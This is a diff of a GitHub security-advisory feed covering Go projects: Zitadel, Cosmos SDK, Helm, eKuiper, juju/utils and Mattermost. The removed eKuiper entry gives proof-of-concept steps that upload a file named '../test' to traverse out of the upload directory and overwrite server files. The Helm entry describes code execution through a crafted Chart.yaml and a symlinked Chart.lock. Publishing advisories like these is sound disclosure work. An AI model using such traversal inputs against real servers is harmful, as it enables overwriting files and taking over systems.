+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.54.8">https://github.com/zitadel/zitadel/releases/tag/v2.54.8</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.55.5">https://github.com/zitadel/zitadel/releases/tag/v2.55.5</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.56.2">https://github.com/zitadel/zitadel/releases/tag/v2.56.2</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.57.1">https://github.com/zitadel/zitadel/releases/tag/v2.57.1</a></li>
+<li><a href="https://github.com/zitadel/zitadel/releases/tag/v2.58.1">https://github.com/zitadel/zitadel/releases/tag/v2.58.1</a></li>
+<li><a href="https://pkg.go.dev/vuln/GO-2024-3015">https://pkg.go.dev/vuln/GO-2024-3015</a></li>
+<li><a href="https://github.com/advisories/GHSA-v333-7h2p-5fhv">https://github.com/advisories/GHSA-v333-7h2p-5fhv</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-v333-7h2p-5fhv</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2024-07-31T20:59:13.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/cosmos/cosmos-sdk] Cosmos SDK's Integer Overflow vulnerability in its Validator Rewards pool can cause a chain halt]]></title>
         <id>https://github.com/advisories/GHSA-p22h-3m2v-cmgh</id>
@@ -87,7 +489,7 @@ Has the problem been patched? What versions should users upgrade to?</p>
         <title type="html"><![CDATA[[helm.sh/helm/v3] Helm vulnerable to Code Injection through malicious chart.yaml content]]></title>
         <id>https://github.com/advisories/GHSA-557j-xg8c-q2mm</id>
         <link href="https://github.com/advisories/GHSA-557j-xg8c-q2mm"/>
-        <updated>2025-07-08T23:20:56.000Z</updated>
+        <updated>2025-07-09T15:05:17.000Z</updated>
         <content type="html"><![CDATA[<p>A Helm contributor discovered that a specially crafted <code>Chart.yaml</code> file along with a specially linked <code>Chart.lock</code> file can lead to local code execution when dependencies are updated.</p>
 <h3 id="impact">Impact</h3>
 <p>Fields in a <code>Chart.yaml</code> file, that are carried over to a <code>Chart.lock</code> file when dependencies are updated and this file is written, can be crafted in a way that can cause execution if that same content were in a file that is executed (e.g., a <code>bash.rc</code> file or shell script). If the <code>Chart.lock</code> file is symlinked to one of these files updating dependencies will write the lock file content to the symlinked file. This can lead to unwanted execution. Helm warns of the symlinked file but did not stop execution due to symlinking.</p>
@@ -104,6 +506,7 @@ Has the problem been patched? What versions should users upgrade to?</p>
 <ul>
 <li><a href="https://github.com/helm/helm/security/advisories/GHSA-557j-xg8c-q2mm">https://github.com/helm/helm/security/advisories/GHSA-557j-xg8c-q2mm</a></li>
 <li><a href="https://github.com/helm/helm/commit/4b8e61093d8f579f1165cdc6bd4b43fa5455f571">https://github.com/helm/helm/commit/4b8e61093d8f579f1165cdc6bd4b43fa5455f571</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-53547">https://nvd.nist.gov/vuln/detail/CVE-2025-53547</a></li>
 <li><a href="https://github.com/advisories/GHSA-557j-xg8c-q2mm">https://github.com/advisories/GHSA-557j-xg8c-q2mm</a></li>
 </ul>
 ]]></content>
@@ -589,207 +992,5 @@ Content-Length: 89
         </author>
         <category label="severity" term="HIGH"/>
         <published>2025-07-03T14:22:05.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/lf-edge/ekuiper] LF Edge eKuiper vulnerable to File Path Traversal leading to file replacement]]></title>
-        <id>https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</id>
-        <link href="https://github.com/advisories/GHSA-fv2p-qj5p-wqq4"/>
-        <updated>2025-07-03T14:18:05.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. In this case, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.</p>
-<h3 id="details">Details</h3>
-<p>The file handler function trusts the filename provided by the user. This includes the cases when the user uses a path instead of the filename. This makes possible to write arbitrary files to the system and <strong>replace</strong> the files owned by <em>kuiper</em> user on the filesystem. The vulnerable function is <code>fileUploadHandler</code> which is shown below:</p>
-<p><a href="https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359">https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359</a></p>
-<p>Exploitation of this vulnerability allows an attacker to rewrite the files owned by ekuiper including the main kuiper binaries as they are owned by <em>kuiper</em> user:</p>
-<p><img alt="kuiper binaries" src="https://github.com/user-attachments/assets/58cf0dc9-20aa-4976-b199-d052a8f5a676"></p>
-<h3 id="poc">PoC</h3>
-<ol start="0">
-<li>The files should be uploaded to <code>/kuiper/data/uploads</code> directory. So let's move to the <code>/kuiper/data</code>, examine the existing files and create an empty <code>traversal-poc</code> file owned by  <em>kuiper</em>:</li>
-</ol>
-<p><img alt="Preparation" src="https://github.com/user-attachments/assets/c1010cfe-ca3e-481d-b895-820a96f2af60"></p>
-<ol>
-<li>Now, we can go to <em>Services &gt; Configuration &gt; File Management</em> and try to upload file with name <code>../test</code>:</li>
-</ol>
-<p><img alt="GUI" src="https://github.com/user-attachments/assets/31402874-d8a1-450b-91d6-025533c7be33"></p>
-<p><img alt="Request in Burp" src="https://github.com/user-attachments/assets/a4b01f57-5ce0-4791-8a6e-69eb47bca40b"></p>
-<p>In the response we can see the path of the uploaded file and can assume that the traversal worked.</p>
-<ol start="2">
-<li>Now we can try to change the <code>traversal-poc</code> file that we know exists on the server. It can be made with the following request:</li>
-</ol>
-<p><img alt="traversal-poc change" src="https://github.com/user-attachments/assets/164a7088-9152-4a6d-bef4-de8b4637ed51"></p>
-<ol start="3">
-<li>Now, if we look at the server, we can see the file created in the traversed directory and the replaced poc-file:</li>
-</ol>
-<p><img alt="Changed files" src="https://github.com/user-attachments/assets/1be0bb36-66b7-4552-9b5d-6298c15d59bb"></p>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>Possibility to upload files to external directories;</li>
-<li>Possibility to rewrite any file owned by <em>kuiper</em> user on the filesystem.</li>
-</ul>
-<p>Reported by Alexey Kosmachev, Lead Pentester from Bi.Zone</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/lf-edge/ekuiper/security/advisories/GHSA-fv2p-qj5p-wqq4">https://github.com/lf-edge/ekuiper/security/advisories/GHSA-fv2p-qj5p-wqq4</a></li>
-<li><a href="https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359">https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359</a></li>
-<li><a href="https://github.com/advisories/GHSA-fv2p-qj5p-wqq4">https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-07-03T14:18:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/lf-edge/ekuiper/v2] LF Edge eKuiper vulnerable to File Path Traversal leading to file replacement]]></title>
-        <id>https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</id>
-        <link href="https://github.com/advisories/GHSA-fv2p-qj5p-wqq4"/>
-        <updated>2025-07-03T14:18:05.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. In this case, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.</p>
-<h3 id="details">Details</h3>
-<p>The file handler function trusts the filename provided by the user. This includes the cases when the user uses a path instead of the filename. This makes possible to write arbitrary files to the system and <strong>replace</strong> the files owned by <em>kuiper</em> user on the filesystem. The vulnerable function is <code>fileUploadHandler</code> which is shown below:</p>
-<p><a href="https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359">https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359</a></p>
-<p>Exploitation of this vulnerability allows an attacker to rewrite the files owned by ekuiper including the main kuiper binaries as they are owned by <em>kuiper</em> user:</p>
-<p><img alt="kuiper binaries" src="https://github.com/user-attachments/assets/58cf0dc9-20aa-4976-b199-d052a8f5a676"></p>
-<h3 id="poc">PoC</h3>
-<ol start="0">
-<li>The files should be uploaded to <code>/kuiper/data/uploads</code> directory. So let's move to the <code>/kuiper/data</code>, examine the existing files and create an empty <code>traversal-poc</code> file owned by  <em>kuiper</em>:</li>
-</ol>
-<p><img alt="Preparation" src="https://github.com/user-attachments/assets/c1010cfe-ca3e-481d-b895-820a96f2af60"></p>
-<ol>
-<li>Now, we can go to <em>Services &gt; Configuration &gt; File Management</em> and try to upload file with name <code>../test</code>:</li>
-</ol>
-<p><img alt="GUI" src="https://github.com/user-attachments/assets/31402874-d8a1-450b-91d6-025533c7be33"></p>
-<p><img alt="Request in Burp" src="https://github.com/user-attachments/assets/a4b01f57-5ce0-4791-8a6e-69eb47bca40b"></p>
-<p>In the response we can see the path of the uploaded file and can assume that the traversal worked.</p>
-<ol start="2">
-<li>Now we can try to change the <code>traversal-poc</code> file that we know exists on the server. It can be made with the following request:</li>
-</ol>
-<p><img alt="traversal-poc change" src="https://github.com/user-attachments/assets/164a7088-9152-4a6d-bef4-de8b4637ed51"></p>
-<ol start="3">
-<li>Now, if we look at the server, we can see the file created in the traversed directory and the replaced poc-file:</li>
-</ol>
-<p><img alt="Changed files" src="https://github.com/user-attachments/assets/1be0bb36-66b7-4552-9b5d-6298c15d59bb"></p>
-<h3 id="impact">Impact</h3>
-<ul>
-<li>Possibility to upload files to external directories;</li>
-<li>Possibility to rewrite any file owned by <em>kuiper</em> user on the filesystem.</li>
-</ul>
-<p>Reported by Alexey Kosmachev, Lead Pentester from Bi.Zone</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/lf-edge/ekuiper/security/advisories/GHSA-fv2p-qj5p-wqq4">https://github.com/lf-edge/ekuiper/security/advisories/GHSA-fv2p-qj5p-wqq4</a></li>
-<li><a href="https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359">https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359</a></li>
-<li><a href="https://github.com/advisories/GHSA-fv2p-qj5p-wqq4">https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2025-07-03T14:18:04.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/juju/utils/v4/cert] juju/utils leaks private key in certs]]></title>
-        <id>https://github.com/advisories/GHSA-h34r-jxqm-qgpr</id>
-        <link href="https://github.com/advisories/GHSA-h34r-jxqm-qgpr"/>
-        <updated>2025-07-01T17:35:18.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Certs generated by v4 contain their private key.</p>
-<h2 id="details">Details</h2>
-<h3 id="background">Background</h3>
-<p>Recently, I encountered an API in Go that’s easy to misuse: sha512.Sum384 and sha512.New384().Sum look very similar and behave very differently. <a href="https://go.dev/play/p/kDCqqoYk84k">https://go.dev/play/p/kDCqqoYk84k</a> demonstrates this. I want to discuss extending static analysis to detect this case with the go community, but before I do that, I want to make a best-effort pass at open-source projects to fix the existing bugs. I figured that if there were any vulnerabilities out there, they would be easy to find once that discussion begins, so it’s better to address them early. </p>
-<p>This work is a hobby project and has no affiliation with my employer, so I may be slow to respond due to existing commitments. </p>
-<h3 id="poc">PoC</h3>
-<p><a href="https://go.dev/play/p/vSW0U3Hq4qk">https://go.dev/play/p/vSW0U3Hq4qk</a></p>
-<h3 id="impact">Impact</h3>
-<p><a href="https://github.com/juju/utils/blob/0141ef0ee74a0cac603c5c9e4aff194008722f41/cert/cert.go#L120">This code</a> (cert.NewLeaf) generates certs with the SubjectKeyId set to <code>sha512.New384().Sum(/* private */ key)</code>.</p>
-<p>If a cert which was generated by cert.NewLeaf is transferred over the network in plaintext, as is often the case in TLS handshakes, an attacker listening on that network may sniff the cert and trivially extract the private key from it. This applies to client and server TLS certs generated by vulnerable versions of this library.</p>
-<p>Getting the server cert and its key would only require performing a TLS handshake (with a matching SNI) with the server. At that point, the attacker could impersonate the server.</p>
-<p>Similarly, getting the client cert and its key would require getting the client to perform a TLS handshake against an attacker-controlled server. At that point, an attacker could impersonate the client.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/juju/utils/security/advisories/GHSA-h34r-jxqm-qgpr">https://github.com/juju/utils/security/advisories/GHSA-h34r-jxqm-qgpr</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6224">https://nvd.nist.gov/vuln/detail/CVE-2025-6224</a></li>
-<li><a href="https://github.com/juju/utils/commit/766f27d7bcd10433453a9764509a864c17a46a76">https://github.com/juju/utils/commit/766f27d7bcd10433453a9764509a864c17a46a76</a></li>
-<li><a href="https://github.com/juju/utils/releases/tag/v4.0.4">https://github.com/juju/utils/releases/tag/v4.0.4</a></li>
-<li><a href="https://github.com/advisories/GHSA-h34r-jxqm-qgpr">https://github.com/advisories/GHSA-h34r-jxqm-qgpr</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h34r-jxqm-qgpr</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-07-01T17:35:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</id>
-        <link href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf"/>
-        <updated>2025-06-30T20:40:42.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly validate channel membership when retrieving playbook run metadata, allowing authenticated users who are playbook members but not channel members to access sensitive information about linked private channels including channel name, display name, and participant count through the run metadata API endpoint.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47871">https://nvd.nist.gov/vuln/detail/CVE-2025-47871</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf">https://github.com/advisories/GHSA-wgvp-jj4w-88hf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-06-30T18:31:50.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</id>
-        <link href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf"/>
-        <updated>2025-06-30T20:40:42.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly validate channel membership when retrieving playbook run metadata, allowing authenticated users who are playbook members but not channel members to access sensitive information about linked private channels including channel name, display name, and participant count through the run metadata API endpoint.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47871">https://nvd.nist.gov/vuln/detail/CVE-2025-47871</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf">https://github.com/advisories/GHSA-wgvp-jj4w-88hf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-06-30T18:31:50.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</id>
-        <link href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf"/>
-        <updated>2025-06-30T20:40:42.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly validate channel membership when retrieving playbook run metadata, allowing authenticated users who are playbook members but not channel members to access sensitive information about linked private channels including channel name, display name, and participant count through the run metadata API endpoint.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47871">https://nvd.nist.gov/vuln/detail/CVE-2025-47871</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf">https://github.com/advisories/GHSA-wgvp-jj4w-88hf</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2025-06-30T18:31:50.000Z</published>
     </entry>
 </feed>
